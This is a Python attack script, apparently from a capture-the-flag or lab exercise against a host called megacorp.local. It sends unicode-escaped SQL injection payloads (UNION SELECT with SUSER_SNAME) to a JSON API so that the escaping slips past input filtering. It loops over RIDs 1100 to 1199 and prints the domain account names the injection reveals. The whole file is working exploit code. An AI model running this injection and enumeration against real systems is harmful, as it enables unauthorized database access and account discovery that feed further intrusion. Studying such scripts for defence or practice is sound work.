import json
import requests
from time import sleep

url = 'http://megacorp.local/api/getColleagues'

def unicode_escape(string):
    # Formats every character strictly into a 4-digit \uXXXX sequence
    return ''.join(f"\\u{ord(c):04x}" for c in string)

# Start RID brutforce from specified range
for i in range(1100, 1200):
    # Convert integer to a 4-character uppercase hex string
    hex_str = f"{i:04X}"
    
    # Parse to bytes, reverse for little-endian, and convert back to hex string
    b = bytearray.fromhex(hex_str)
    b.reverse()
    t = b.hex().upper() + '0'*4
    
    sid = f"0x0105000000000005150000001c00d1bcd181f1492bdfc236{t}"
    payload = f"test' UNION SELECT 1,SUSER_SNAME({sid}),3,4,5-- -"
    
    try:
        r = requests.post(url, data='{"name":"' + unicode_escape(payload) + '"}', headers={'Content-Type': 'application/json'}, timeout=5)
        response_data = json.loads(r.text)
        
        if response_data and "name" in response_data[0]:
            user = response_data[0]["name"]
            if user:
                print(user)
                sleep(2)
    except Exception as e:
        print(f"[-] Connection error or timeout at RID {i}. Exiting.")
        break
